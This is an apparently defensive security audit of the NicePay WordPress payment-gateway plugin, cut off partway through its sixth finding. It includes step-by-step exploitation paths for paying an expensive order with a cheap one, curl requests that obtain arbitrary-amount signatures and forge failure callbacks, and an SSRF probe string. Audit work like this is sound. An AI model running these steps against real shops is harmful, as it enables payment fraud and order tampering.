# Security Assessment

NicePay Payment Gateway v2.0.0 gets the *cryptographic primitives* right — every signature preimage matches the vendor spec, every comparison uses `hash_equals()`, the SSRF allowlist is fail-closed and applied to both attacker-influenced URLs, and the SQL layer is clean throughout. What is missing is the layer above the crypto: **nothing binds a verified signature to the order it is supposed to pay for.** The NICEPAY auth-response signature covers `AuthToken + MID + Amt + MerchantKey` and deliberately does *not* cover `Moid`; the spec therefore makes order binding the merchant's responsibility, and this plugin never performs it. Combined with a `nopriv` AJAX endpoint that will sign any amount a caller names using the same MID and merchant key, that yields a money-losing path an unauthenticated attacker can walk end to end. This document enumerates all 28 security findings: 1 critical, 4 high, 9 medium and 14 low, along with the entry-point surface they live on and a hardening checklist ordered so the highest-leverage fixes come first.

---

## 1. Executive risk summary

| # | Risk | Severity | Attacker capability | Outcome |
|---|------|----------|---------------------|---------|
| SECURITY-01 | Order binding is never validated | **Critical** | Any shopper | Expensive order completed by paying a cheap one |
| SECURITY-02 | One MID/key serves the public signing endpoint *and* WooCommerce checkout | High | None (anonymous) | Removes the precondition from SECURITY-01 |
| SECURITY-03 | `nopriv` endpoint signs any client-supplied amount | High | None (anonymous) | Signing oracle + unbounded DB inserts |
| SECURITY-04 | DB and order writes execute before signature verification | High | None (anonymous) | Order-state tampering and audit-trail corruption |
| SECURITY-05 | No idempotency or order-state guard | High | Any shopper | Replay downgrades a paid order to `failed` |
| SECURITY-06 … 14 | Cancel-path fail-open, cached nonce, unmatched-Moid capture, weak Moid, test-mode default, key echo, CSS injection, PII logging, missing VBANK endpoint | Medium | Varies | Silent money loss, PII exposure, broken flows |
| SECURITY-15 … 28 | Escaping context bugs, headers, settings validation, CI, docs | Low | Varies | Hardening and maintenance hazards |

**The three fixes that matter most**, in order:

1. Assert `Amt`, `MID` and `Moid` against the order in both return handlers, and net-cancel on mismatch (SECURITY-01).
2. Make the server the price authority for `[nicepay_payment]` — derive the amount from a saved preset, never from `$_POST` (SECURITY-03).
3. Move the signature gate above the `AuthResultCode` branch, and add a terminal-state guard at the top of both handlers (SECURITY-04, SECURITY-05).

Everything else is meaningfully cheaper to fix and meaningfully less dangerous.

---

## 2. What this codebase does well

This is not a boilerplate plugin, and several controls here are better than what most payment integrations ship. These deserve to be stated plainly before the findings, because a reader skimming 28 issues will otherwise draw the wrong conclusion about the codebase's overall quality.

**SSRF protection is real, deliberate and fail-closed.** [`validate_nicepay_url()`](../../includes/class-nicepay-api.php#L140) requires the `https` scheme explicitly and uses strict `in_array( ..., true )` against a four-host allowlist, and it is applied to *both* attacker-influenced URLs — `NextAppURL` at [class-nicepay-api.php:186](../../includes/class-nicepay-api.php#L186) and `NetCancelURL` at [class-nicepay-api.php:281](../../includes/class-nicepay-api.php#L281). Probed against uppercase hosts, trailing dots, `userinfo@evil.com`, IDN homographs and lookalike suffixes, every one fails closed. This is the single most commonly botched control in payment-gateway plugins and it is done right here.

**All four signature comparisons use `hash_equals()`** — `verify_auth_signature` ([86](../../includes/class-nicepay-api.php#L86)), `verify_approval_signature` ([105](../../includes/class-nicepay-api.php#L105)), `verify_cancel_signature` ([124](../../includes/class-nicepay-api.php#L124)) — and the preimages match the vendor spec exactly. [`NicePaySignatureIntegrationTest.php`](../../tests/unit/NicePaySignatureIntegrationTest.php) pins all six SignData/Signature formulas against the worked examples from the official manual, so the crypto layer itself is both correct and regression-protected.

**The approval path is properly fail-closed and triggers 망취소 correctly.** [class-nicepay-api.php:248-267](../../includes/class-nicepay-api.php#L248) refuses a response with a missing `Signature` or `TID`, refuses one that fails verification, and calls `request_net_cancel()` on the network-error, parse-error, missing-signature *and* bad-signature branches — four separate reversal triggers. That is more careful than most integrations, and it is the pattern the cancel path should be brought up to (see SECURITY-06).

**SQL is clean throughout.** All eight `$wpdb` call sites were reviewed: `%s`/`%d` placeholders are correctly paired with their value arrays, `ORDER BY` is constrained by a hard allowlist at [nicepay-functions.php:195-196](../../includes/nicepay-functions.php#L195) rather than interpolated, sort direction is normalised to a literal `ASC`/`DESC` ([line 197](../../includes/nicepay-functions.php#L197)), LIMIT/OFFSET are bound as `%d` rather than concatenated, and the search term goes through `$wpdb->esc_like()` before being wrapped in wildcards ([line 185](../../includes/nicepay-functions.php#L185)). No injection was found anywhere.

**Output escaping in the admin transactions list table is consistently correct across all nine columns** — `esc_html()` for text, `esc_attr()` for attributes including the `data-copy`/`data-tid`/`data-nonce` payloads, `esc_url()` on the order link, and `wp_kses_post()` on the `paginate_links` output. Data arriving from a NicePay response (`pay_method_name`, `buyer_name`, `result_msg`) is escaped at the point of display, so a spoofed PG response cannot inject into the admin screen.

**Both admin AJAX handlers check capability AND nonce before any side effect**, in the correct order, with the checks combined in a single guard clause that cannot be accidentally bypassed by a later edit — [nicepay-payment-gateway.php:365-371](../../nicepay-payment-gateway.php#L365), [444-450](../../nicepay-payment-gateway.php#L444) and [class-nicepay-transactions.php:186-189](../../admin/class-nicepay-transactions.php#L186). The destructive cancel action uses a **per-row nonce** (`'nicepay_cancel_' . $item->id`) rather than one global token, which is the right granularity.

**Every one of the ten PHP files that actually ships in the release ZIP carries an `ABSPATH` guard**, including both templates — verified by a scripted check across all 16 PHP files. The release workflow builds its artifact from an explicit copy list, so `tests/`, `.git/`, `composer.json` and `phpunit.xml` are correctly excluded from the distributed plugin.

**`sslverify => true` is set explicitly on all three outbound calls** rather than left to a default, and the merchant key genuinely never leaves the server — it appears only inside `hash()` preimages, never in a request body, never in a JSON response, and never in a log line.

**Both JavaScript toast/notice helpers escape their message text before insertion** — [nicepay.js:81](../../assets/js/nicepay.js#L81) and [nicepay-admin.js:34](../../assets/js/nicepay-admin.js#L34), both using `$('<span>').text(message).html()` — so PG-supplied `ResultMsg` text reaching the admin toast is neutralised. The element-content cases are handled correctly; only the attribute-context case at [nicepay-admin.js:80](../../assets/js/nicepay-admin.js#L80) uses the wrong escaper.

**CI pins every third-party GitHub Action to a full 40-character commit SHA** (`actions/checkout`, `shivammathur/setup-php`, `actions/cache`, `actions/upload-artifact`, `softprops/action-gh-release`) rather than a mutable tag — textbook supply-chain hygiene that most repositories of this size skip — and tests run across the full PHP 7.4 → 8.3 matrix.

**The right patterns are already present in the codebase.** `sanitize_hex_color()` is correctly applied to `button_color` on the AJAX save path ([nicepay-payment-gateway.php:393](../../nicepay-payment-gateway.php#L393)), and `pay_method` is correctly re-validated against the enabled-methods allowlist at render time ([standalone-payment-form.php:34-36](../../templates/standalone-payment-form.php#L34)) rather than trusted from the shortcode. Several findings below are places where an existing correct pattern simply was not applied consistently.

**Redirects are safe throughout.** All five redirect call sites use `wp_safe_redirect()` with server-derived targets (`wc_get_checkout_url()`, `$this->get_return_url( $order )`), and both JavaScript `location.href` assignments are fed server-generated URLs. No open-redirect surface exists anywhere, and no request parameter reaches a redirect target.

---

## 3. Entry-point surface

Every externally reachable code path in the plugin, and what guards it today.

| Entry point | Registered at | Auth req'd | Nonce | Capability | Input validated | Findings |
|---|---|---|---|---|---|---|
| `/?wc-api=nicepay_return` → `handle_return()` | [gateway.php:36](../../includes/class-nicepay-gateway.php#L36) | No | No | No | Signature only — **after** the failure-branch writes; no `Amt`/`MID`/`Moid` binding; no method check | 01, 04, 05, 09, 19 |
| `/nicepay-return/`, `/?nicepay_return=1` → `NicePay_Return_Handler::process()` | [nicepay-payment-gateway.php:202-217](../../nicepay-payment-gateway.php#L202) | No | No | No | Signature only — after writes; no null-transaction guard before capture | 01, 04, 05, 08, 16, 19 |
| `wp_ajax_nopriv_nicepay_init_payment` | [nicepay-payment-gateway.php:82](../../nicepay-payment-gateway.php#L82) | **No** | Yes — but a shared anonymous constant, page-baked | No | `(float) $amount > 0` **only**; no price authority, no rate limit, no length caps | 03, 02, 07, 23 |
| `wp_ajax_nicepay_init_payment` | [nicepay-payment-gateway.php:81](../../nicepay-payment-gateway.php#L81) | Yes | Yes | No | Same as above | 03 |
| `wp_ajax_nicepay_save_shortcode` | [nicepay-payment-gateway.php:83](../../nicepay-payment-gateway.php#L83) | Yes | ✅ `nicepay_admin_shortcodes` | ✅ `manage_options` | Per-field sanitizers incl. `sanitize_hex_color()`; no entry cap, `$sc['id']` unguarded | 24 |
| `wp_ajax_nicepay_delete_shortcode` | [nicepay-payment-gateway.php:84](../../nicepay-payment-gateway.php#L84) | Yes | ✅ same | ✅ `manage_options` | `$sc['id']` unguarded; no `is_preset` protection | 24 |
| `wp_ajax_nicepay_cancel_transaction` | [class-nicepay-transactions.php:13](../../admin/class-nicepay-transactions.php#L13) | Yes | ✅ per-row `nicepay_cancel_{id}` | ✅ `manage_options` | Nonce covers `$_POST['id']` but action uses `$_POST['tid']`; no status guard | 18 |
| `[nicepay_payment]` shortcode | [nicepay-payment-gateway.php:78](../../nicepay-payment-gateway.php#L78) | No (render) | n/a | n/a | `pay_method` allowlisted ✅; `button_color`, `currency`, `display_mode`, `button_class` **not** | 12, 07, 10 |
| Admin menu + settings screens | [class-nicepay-admin.php:18-35](../../admin/class-nicepay-admin.php#L18), guard at [125](../../admin/class-nicepay-admin.php#L125) | Yes | ✅ via `options.php` | ✅ `manage_options` | 8 of 10 `register_setting()` calls lack `sanitize_callback`; keys echoed into HTML | 11, 17 |
| WooCommerce receipt page → `generate_payment_form()` | [gateway.php:35](../../includes/class-nicepay-gateway.php#L35) | Yes (order key) | n/a | n/a | Inserts a **new** transaction row on every render | 05 |
| Outbound: `NextAppURL`, `NetCancelURL` | [api.php:186](../../includes/class-nicepay-api.php#L186), [281](../../includes/class-nicepay-api.php#L281) | — | — | — | ✅ allowlisted; no port/path pinning, `redirection` default 5 | 20, 22 |
| Outbound: `NICEPAY_CANCEL_URL` | [api.php:360](../../includes/class-nicepay-api.php#L360) | — | — | — | ❌ **never** passed through `validate_nicepay_url()` | 20, 21 |
| VBANK deposit notification (입금통보) | — | — | — | — | ❌ **endpoint does not exist** | 14 |

Note that both browser-facing return endpoints receive a **browser POST** — [payment-form.php:80-82](../../templates/payment-form.php#L80) and [standalone-payment-form.php:319-321](../../templates/standalone-payment-form.php#L319) both submit `document.payForm` from the customer's own browser. An IP allowlist there would break every payment; the documented NICEPAY inbound IPs apply only to the deposit notification, which is the endpoint that does not exist yet (SECURITY-14).

---

## 4. Findings

### SECURITY-01 · 🔴 CRITICAL · Order binding is unsigned and never re-validated

**Files:** [includes/class-nicepay-gateway.php:226-234](../../includes/class-nicepay-gateway.php#L226), [275](../../includes/class-nicepay-gateway.php#L275), [292-303](../../includes/class-nicepay-gateway.php#L292), [358-393](../../includes/class-nicepay-gateway.php#L358); [includes/class-nicepay-api.php:83-87](../../includes/class-nicepay-api.php#L83), [193-205](../../includes/class-nicepay-api.php#L193)

**Attacker capability:** any shopper.

**Problem.** `handle_return()` resolves the order solely from the POSTed `Moid`, but `Moid` is not an input to any signature. `verify_auth_signature()` hashes only `AuthToken . MID . Amt . MerchantKey`. The approval request carries TID/AuthToken/MID/Amt/EdiDate/SignData/CharSet and **no `Moid`**. The approval response's `Moid`, `MID` and `Amt` are never compared to the order that is about to be completed. `get_total()` appears only at [gateway.php:124](../../includes/class-nicepay-gateway.php#L124), [434](../../includes/class-nicepay-gateway.php#L434) and [438](../../includes/class-nicepay-gateway.php#L438) — all outbound (form build and refund), never as an inbound assertion.

```php
// includes/class-nicepay-api.php:83-87
public function verify_auth_signature( $auth_token, $amt, $received_signature ) {
    $plain    = $auth_token . $this->mid . $amt . $this->merchant_key;
    $expected = hash( 'sha256', $plain );
    return hash_equals( $expected, $received_signature );
}   // no Moid, no order reference
```

```php
// includes/class-nicepay-gateway.php:234
$transaction = nicepay_get_transaction_by_moid( $moid );

// includes/class-nicepay-gateway.php:275 — the only integrity gate
if ( empty( $signature ) || ! $this->api->verify_auth_signature( $auth_token, $amt, $signature ) ) {

// includes/class-nicepay-gateway.php:358-380 — no amount or Moid assertion in between
if ( $this->api->is_success_code( $result_code, $result_method ) ) { ...
    $order->payment_complete( $tid );
```

**Impact.** Direct money loss. A shopper places order A (expensive) and order B (cheap), authenticates order B, and — because the auth response is POSTed from their own browser ([payment-form.php:80-82](../../templates/payment-form.php#L80): `window.nicepaySubmit = function(){ document.payForm.submit(); }`) — swaps only `Moid` to order A's value. `verify_auth_signature($auth_token, '1000', $signature)` still returns true, `request_approval()` captures 1,000 KRW, `is_success_code()` passes, and `$order->payment_complete($tid)` fires on order A: stock decrements, downloads release, the order reaches processing/completed. The transactions row records the low amount, so the discrepancy surfaces only on manual reconciliation.

**Exploitation path.**
1. Place order A = 1,000,000 KRW; load the receipt page (writes `moid_A` into `wp_nicepay_transactions`).
2. Place order B = 1,000 KRW; note `moid_B`.
3. Complete card auth for B.
4. With a proxy or a devtools breakpoint, change `Moid=moid_B` → `Moid=moid_A` in the POST to `/wc-api/nicepay_return`, leaving `AuthToken`/`Amt`/`TxTid`/`Signature` untouched.
5. Order A is marked paid for 1,000 KRW.

SECURITY-02 removes even step 1–3: an attacker can mint a 100 KRW SignData from the public AJAX endpoint instead of placing a cheap order.

**Spec.** NICEPAY 인증결제 v2.0.8 §3 confirms the auth-response Signature preimage is `AuthToken + MID + Amt + MerchantKey`, so this gap is inherent to the protocol and **must** be compensated for by the merchant. §7 documents the approval-response `Amt` zero-padding (`000000001004`), which is why the comparison must cast to `int`.

**Recommendation.** Immediately after the signature gate in *both* `WC_Gateway_NicePay::handle_return()` (after line 289) and `NicePay_Return_Handler::process()` (after line 83), assert the unsigned bindings: (a) `(int) $amt === (int) nicepay_get_amount( $order->get_total(), $order->get_currency() )`; (b) `hash_equals( (string) $this->api->get_mid(), (string) $mid )`. Then after `request_approval()` returns, assert `hash_equals( $moid, (string) ( $result['Moid'] ?? '' ) )` and `(int) $result['Amt'] === $expected_amt`. Any mismatch must call `request_net_cancel( $auth_data )` and refuse to complete. As defence in depth, generate a 32-hex per-transaction token, persist it on the transaction row, send it in `ReqReserved` (spec §4: 500 bytes, no double quotes) and `hash_equals()` it against the returned value. Note `$req_reserved` is already read at [gateway.php:231](../../includes/class-nicepay-gateway.php#L231) and then never used — the field is available and currently dead.

```php
// includes/class-nicepay-gateway.php — insert directly after the signature check (after line 289)
$expected_amt = (int) nicepay_get_amount( $order->get_total(), $order->get_currency() );
if ( (int) $amt !== $expected_amt || ! hash_equals( (string) $this->api->get_mid(), (string) $mid ) ) {
    nicepay_log( 'Return handler: amount/MID mismatch', array( 'posted' => $amt, 'expected' => $expected_amt ) );
    if ( ! empty( $net_cancel_url ) ) {
        $this->api->request_net_cancel( array(
            'TxTid' => $tx_tid, 'AuthToken' => $auth_token, 'Amt' => $amt, 'NetCancelURL' => $net_cancel_url,
        ) );
    }
    nicepay_update_transaction( $transaction->id, array( 'status' => 'failed', 'result_code' => 'AMT_MISMATCH' ) );
    $order->update_status( 'failed', __( 'NicePay: amount mismatch, payment reversed.', 'nicepay-payment-gateway' ) );
    wp_safe_redirect( wc_get_checkout_url() );
    exit;
}

// ...and after $result = $this->api->request_approval( $auth_data ); succeeds (after line 317)
if ( ( isset( $result['Moid'] ) && ! hash_equals( $moid, (string) $result['Moid'] ) )
     || ( isset( $result['Amt'] ) && (int) $result['Amt'] !== $expected_amt ) ) {
    $this->api->request_net_cancel( $auth_data );
    nicepay_update_transaction( $transaction->id, array( 'status' => 'failed', 'result_code' => 'BIND_MISMATCH' ) );
    $order->update_status( 'failed', __( 'NicePay: response did not match this order; payment reversed.', 'nicepay-payment-gateway' ) );
    wp_safe_redirect( wc_get_checkout_url() );
    exit;
}
```

**Effort:** small.

---

### SECURITY-02 · 🟠 HIGH · One MID/merchant-key pair serves both the public signing endpoint and the WooCommerce return handler

**Files:** [nicepay-payment-gateway.php:333-336](../../nicepay-payment-gateway.php#L333); [includes/class-nicepay-api.php:22-33](../../includes/class-nicepay-api.php#L22), [74-87](../../includes/class-nicepay-api.php#L74); [includes/class-nicepay-gateway.php:275](../../includes/class-nicepay-gateway.php#L275); [includes/class-nicepay-return-handler.php:70](../../includes/class-nicepay-return-handler.php#L70)

**Attacker capability:** none (no account).

**Problem.** `ajax_init_payment` instantiates `new NicePay_API()`, which reads the same `nicepay_mode`/MID/merchant-key options as the WooCommerce gateway, and calls `create_auth_sign_data( $edi_date, $amount )` on a client-supplied amount. `verify_auth_signature()` is the identical method with the identical preimage in both return handlers, and neither handler records or checks which flow a given `Moid` or `AuthToken` originated from. There is **no flow discriminator anywhere**: no separate MID, no `ReqReserved` marker, no check that an `SP_` Moid may only be presented to the standalone endpoint or that a `WC…` Moid may only be presented to the WooCommerce endpoint.

```php
// nicepay-payment-gateway.php:333-336 — same credentials as the WooCommerce gateway
$api       = new NicePay_API();
$edi_date  = $api->generate_edi_date();
$moid      = $api->generate_moid( 'SP' );
$sign_data = $api->create_auth_sign_data( $edi_date, $amount );
```

[gateway.php:235](../../includes/class-nicepay-gateway.php#L235) checks only `! $transaction->wc_order_id` — which an `SP_` row would fail — but the attack presents a *WooCommerce* Moid, so that check passes.

**Impact.** This removes the only real precondition from SECURITY-01. Without it an attacker must place a genuine cheap order to obtain a low-amount signed auth. With it, they simply call the anonymous AJAX endpoint for a 100 KRW `SignData`, complete a real 100 KRW payment through the NICEPAY window, and POST the resulting auth response to `/wc-api/nicepay_return` with any WooCommerce order's `Moid`. Any shop that has both a `[nicepay_payment]` shortcode and WooCommerce checkout enabled is exposed.

**Exploitation path.** (1) Lift the shared anonymous nonce from any page carrying the shortcode. (2) `curl -X POST …/admin-ajax.php -d 'action=nicepay_init_payment&nonce=…&amount=100&goods_name=x&buyer_name=x&buyer_email=x@x.com&buyer_tel=01000000000'` and keep `sign_data` + `edi_date`. (3) Build a payment form with `Amt=100`, that SignData, and the attacker's own Moid; complete the 100 KRW card payment. (4) Intercept the auth response and POST it to `/?wc-api=nicepay_return` with `Moid` set to a victim order's Moid.

**Recommendation.** Fix the root cause first (SECURITY-01 order binding + SECURITY-03 server-side price authority). In addition, add a flow discriminator: send a per-transaction random token in `ReqReserved` (spec §4, 500 bytes) recording both the flow and the transaction id, persist it on the row, and `hash_equals()` it in each handler. Cheaply, also reject any `Moid` that does not match the receiving endpoint's flow prefix.

```php
// includes/class-nicepay-gateway.php handle_return(), immediately after $moid is read (after line 226)
if ( ! preg_match( '/^WC\d+_/', $moid ) ) {
    nicepay_log( 'Return handler: Moid does not belong to the WooCommerce flow', $moid );
    status_header( 400 );
    wp_die( esc_html__( 'Invalid payment callback.', 'nicepay-payment-gateway' ), 'NicePay Error', array( 'response' => 400 ) );
}

// includes/class-nicepay-return-handler.php process(), after line 38
if ( 0 !== strpos( $moid, 'SP_' ) ) {
    nicepay_log( 'Standalone return: Moid does not belong to the standalone flow', $moid );
    $this->render_result_page( false, __( 'This payment could not be matched to an order.', 'nicepay-payment-gateway' ) );
    return;
}
```

**Spec:** §3 (auth response Signature has no flow or order binding), §4 (`ReqReserved`, 500 bytes). **Effort:** small.

---

### SECURITY-03 · 🟠 HIGH · `nopriv` AJAX endpoint signs any client-supplied amount

**Files:** [nicepay-payment-gateway.php:81-82](../../nicepay-payment-gateway.php#L81), [313-359](../../nicepay-payment-gateway.php#L313); [templates/standalone-payment-form.php:305](../../templates/standalone-payment-form.php#L305)

**Attacker capability:** none (no account).

**Problem.** `ajax_init_payment` is registered for both `wp_ajax_` and `wp_ajax_nopriv_`. It takes `$_POST['amount']` verbatim, performs no allowlist and no price lookup, and returns `create_auth_sign_data( $edi_date, $amount )` = `sha256( EdiDate . MID . Amt . MerchantKey )` to the caller. The shortcode's configured amount exists only in rendered HTML; the server never re-derives it. The handler accepts no `shortcode_id`/`preset` parameter — all 47 lines were read — so it *cannot* know what the price was supposed to be.

```php
// nicepay-payment-gateway.php:322, 328 — the only validation
$amount = isset( $_POST['amount'] ) ? sanitize_text_field( wp_unslash( $_POST['amount'] ) ) : '';
if ( empty( $amount ) || (float) $amount <= 0 ) {

// nicepay-payment-gateway.php:336, 354-358
$sign_data = $api->create_auth_sign_data( $edi_date, $amount );
wp_send_json_success( array( 'edi_date' => $edi_date, 'moid' => $moid, 'sign_data' => $sign_data ) );
```

`'1e5'` passes as 100000 and `'100abc'` passes as 100, while the signature is computed over the **literal string**, desynchronising the signed value from the `decimal(12,2)` column.

The nonce is a weak barrier: for logged-out visitors WordPress derives it from `wp_hash( $tick . '|' . $action . '|0|' )` (uid 0, empty session token), so it is one constant shared by every anonymous visitor and valid for up to 24 hours.

**Impact.** The plugin mints a valid NICEPAY SignData for any amount an anonymous caller names, using the merchant's live MID and live merchant key. A buyer can obtain a signature for 100 KRW instead of 50,000 KRW, drive the real payment window with it, and have the return handler record the transaction as `paid` — because that handler validates the amount only against itself. Secondarily, the endpoint inserts a row into `wp_nicepay_transactions` on **every** call with attacker-controlled `buyer_name`/`email`/`tel`/`goods_name`, with no rate limit, no CAPTCHA and no cap — unbounded unauthenticated database growth. (The plugin performs no automatic fulfilment for standalone payments and the list table does show the real amount, so the loss materialises through the merchant's own fulfilment workflow rather than automatically.)

**Recommendation.** Make the server the price authority: require the shortcode to pass its saved-preset `id`, look it up with `nicepay_get_saved_shortcode()` ([nicepay-functions.php:413](../../includes/nicepay-functions.php#L413)), and derive amount, currency and `goods_name` exclusively from the stored record. For ad-hoc shortcodes carrying an inline `amount` attribute with no saved id, HMAC the rendered amount into the page and verify that MAC in the handler. Independently: reject non-numeric input with `is_numeric()`, normalise through `nicepay_get_amount()` before signing, add a per-IP transient rate limit, and truncate buyer fields to the DB column widths (`buyer_name` 100, `buyer_email` 100, `buyer_tel` 30, `goods_name` 100 — schema at [nicepay-payment-gateway.php:123-126](../../nicepay-payment-gateway.php#L123)).

```php
public function ajax_init_payment() {
    check_ajax_referer( 'nicepay_init_payment', 'nonce' );

    $ip   = isset( $_SERVER['REMOTE_ADDR'] ) ? sanitize_text_field( wp_unslash( $_SERVER['REMOTE_ADDR'] ) ) : '';
    $key  = 'nicepay_rl_' . md5( $ip );
    $hits = (int) get_transient( $key );
    if ( $hits >= 10 ) {
        wp_send_json_error( array( 'message' => __( 'Too many attempts. Please try again later.', 'nicepay-payment-gateway' ) ), 429 );
    }
    set_transient( $key, $hits + 1, 10 * MINUTE_IN_SECONDS );

    // Server-side price authority: the amount comes from the saved preset, never from the client.
    $sc_id  = isset( $_POST['shortcode_id'] ) ? sanitize_text_field( wp_unslash( $_POST['shortcode_id'] ) ) : '';
    $preset = $sc_id ? nicepay_get_saved_shortcode( $sc_id ) : null;
    if ( ! $preset || ! isset( $preset['amount'] ) ) {
        wp_send_json_error( array( 'message' => __( 'Unknown payment configuration.', 'nicepay-payment-gateway' ) ), 400 );
    }
    $currency = isset( $preset['currency'] ) ? $preset['currency'] : get_option( 'nicepay_currency', 'KRW' );
    $amount   = nicepay_get_amount( $preset['amount'], $currency );
    if ( ! is_numeric( $amount ) || (float) $amount <= 0 ) {
        wp_send_json_error( array( 'message' => __( 'Invalid payment amount.', 'nicepay-payment-gateway' ) ), 400 );
    }
    $goods_name = mb_strcut( (string) $preset['goods_name'], 0, 40, 'UTF-8' );
    // ... buyer fields from $_POST, truncated to column widths, then sign $amount
}
```

**Spec:** §3 (auth request SignData = `EdiDate + MID + Amt + MerchantKey`). **Effort:** medium.

---

### SECURITY-04 · 🟠 HIGH · Auth-failure branch executes DB and order writes before signature verification

**Files:** [includes/class-nicepay-gateway.php:249-272](../../includes/class-nicepay-gateway.php#L249) (gate at [275](../../includes/class-nicepay-gateway.php#L275)); [includes/class-nicepay-return-handler.php:54-67](../../includes/class-nicepay-return-handler.php#L54) (gate at [70](../../includes/class-nicepay-return-handler.php#L70))

**Attacker capability:** none (no account).

**Problem.** Both return handlers branch on `if ( $auth_result_code !== '0000' )` and perform database and order writes **before** any signature is verified. On that branch there is no nonce, no capability check, no signature check and no source check of any kind. `AuthResultCode`, `AuthResultMsg` and `Moid` all come raw from `$_POST`.

```php
// includes/class-nicepay-gateway.php:249-263
if ( $auth_result_code !== '0000' ) {
    nicepay_log( ... );
    nicepay_update_transaction( $transaction->id, array(
        'status' => 'failed', 'result_code' => $auth_result_code, 'result_msg' => $auth_result_msg,
    ) );
    $order->update_status( 'failed', sprintf(
        __( 'NicePay authentication failed. Code: %1$s, Message: %2$s', ... ), $auth_result_code, $auth_result_msg ) );

// ...twenty-six lines later, includes/class-nicepay-gateway.php:275
if ( empty( $signature ) || ! $this->api->verify_auth_signature( $auth_token, $amt, $signature ) ) {
```

A repo-wide grep for `wp_verify_nonce`, `check_ajax_referer`, `current_user_can` and `REMOTE_ADDR` confirms none of them appear in either handler (`REMOTE_ADDR` appears nowhere in the plugin at all).

**Impact.** Unauthenticated order-state tampering and denial of service. Any WooCommerce order whose Moid is known can be flipped to `failed` regardless of its current state (including processing/completed), its transaction row overwritten with attacker-chosen `result_code`/`result_msg`, and an attacker-authored note injected into the order's status history. A buyer can also self-serve: pay, receive goods, then flip their own order to `failed` to manufacture a refund dispute. Not critical because it does not itself move money or leak credentials — it corrupts state.

**Exploitation path.**
```
curl -X POST 'https://shop.example/?wc-api=nicepay_return' \
  -d 'Moid=WC1042_20260819103015_4471&AuthResultCode=9999&AuthResultMsg=Card+declined+by+issuer'
```
`nicepay_get_transaction_by_moid()` finds the row, `wc_get_order()` loads, the failure branch fires, both writes execute. The signature block at line 275 is never reached. Identical on the standalone endpoint via `POST /?nicepay_return=1` — reachable through the registered query var alone, since [nicepay-payment-gateway.php:208-211](../../nicepay-payment-gateway.php#L208) makes `nicepay_return` a public query var, so `/?nicepay_return=1` works even if rewrite rules were never flushed.

**Recommendation.** Verify the signature **first**, before branching on `AuthResultCode` and before any write. NICEPAY signs the auth response regardless of outcome, so a genuine failure notification still carries a verifiable `Signature`; a request that cannot present one must be rejected with 403 and no side effects. Combine with SECURITY-05 so a signature-valid failure notification still cannot downgrade an already-paid order.

```php
// includes/class-nicepay-gateway.php — move the signature gate above the AuthResultCode branch (line 249)
if ( empty( $signature ) || ! $this->api->verify_auth_signature( $auth_token, $amt, $signature ) ) {
    nicepay_log( 'Return handler: unsigned or invalid callback rejected', array( 'moid' => $moid ) );
    status_header( 403 );
    wp_die( esc_html__( 'Invalid payment callback.', 'nicepay-payment-gateway' ), 'NicePay Error', array( 'response' => 403 ) );
}

if ( $auth_result_code !== '0000' ) { /* existing failure handling */ }
```

**Effort:** small.

---

### SECURITY-05 · 🟠 HIGH · No idempotency or order-state guard — replaying the callback marks a paid order failed

**Files:** [includes/class-nicepay-gateway.php:158](../../includes/class-nicepay-gateway.php#L158), [241-246](../../includes/class-nicepay-gateway.php#L241), [396-404](../../includes/class-nicepay-gateway.php#L396); [includes/class-nicepay-return-handler.php:25-159](../../includes/class-nicepay-return-handler.php#L25)

**Attacker capability:** any shopper (and sub-claim (c) needs no attacker at all).

**Problem.** Neither handler inspects the current state of the order or the transaction before acting. A repo-wide grep for `needs_payment`, `is_paid` and `has_status` returns **zero hits**. Separately, `nicepay_save_transaction()` is called inside `generate_payment_form()`, which runs on every receipt-page render, so each refresh mints a fresh Moid and inserts another independently-payable pending row for the same order.

```php
// includes/class-nicepay-gateway.php:241-246 — existence is checked, state is not
$order = wc_get_order( $transaction->wc_order_id );
if ( ! $order ) { nicepay_log( ... ); wp_die( ... ); return; }

// includes/class-nicepay-gateway.php:396-404 — reachable for an already-paid order
$update_data['status'] = 'failed';
nicepay_update_transaction( $transaction->id, $update_data );
$order->update_status( 'failed', sprintf( __( 'NicePay payment failed. Code: %1$s, Message: %2$s', ... ), $result_code, $result_msg ) );

// includes/class-nicepay-gateway.php:158 — inside generate_payment_form(), runs on every render
$tx_id = nicepay_save_transaction( array( 'order_id' => $moid, 'wc_order_id' => $order->get_id(), 'moid' => $moid, ... ) );
```

**Impact.**
- **(a)** Replaying a captured return POST triggers a second `request_approval()` with the now-spent `AuthToken`; NICEPAY rejects it, `is_success_code()` returns false, and line 399 sets an **already-paid order** to `failed`. The shop loses the order record for money it actually received.
- **(b)** Trivially weaponised by any shopper against their own order to manufacture a dispute. (The handler always ends in `wp_safe_redirect(); exit;`, so there is no result page to refresh — the user must use back-then-resubmit, which browsers prompt about, or replay the POST deliberately.)
- **(c)** Receipt-page refreshes accumulate duplicate pending rows and duplicate Moids per order — unconditionally true, no attacker required — each of which can independently drive the unbound completion path from SECURITY-01.

**Recommendation.** Guard the top of both handlers, and make `generate_payment_form()` reuse the existing pending transaction (look it up by the `_nicepay_moid` order meta written at [line 153](../../includes/class-nicepay-gateway.php#L153)) instead of inserting a new row on every render.

```php
// includes/class-nicepay-gateway.php, immediately after $order is resolved (after line 246)
if ( ! $order->needs_payment() || in_array( $transaction->status, array( 'paid', 'waiting', 'cancelled', 'refunded' ), true ) ) {
    nicepay_log( 'Return handler: duplicate callback ignored', array( 'moid' => $moid, 'status' => $transaction->status ) );
    wp_safe_redirect( $this->get_return_url( $order ) );
    exit;
}
```

**Effort:** small.

---

### SECURITY-06 · 🟡 MEDIUM · Cancel-response verification is skipped when `Signature` is absent; net-cancel responses are never verified or checked

**Files:** [includes/class-nicepay-api.php:314-323](../../includes/class-nicepay-api.php#L314), [384-393](../../includes/class-nicepay-api.php#L384); call sites [225-227](../../includes/class-nicepay-api.php#L225), [238-240](../../includes/class-nicepay-api.php#L238), [251-253](../../includes/class-nicepay-api.php#L251), [262-264](../../includes/class-nicepay-api.php#L262)

**Attacker capability:** for the fail-open half, an actor able to influence the response body from `pg-api.nicepay.co.kr` (TLS-terminating middlebox, DNS/BGP hijack, PG-side compromise). For the silent-net-cancel half, **none** — it needs no attacker at all.

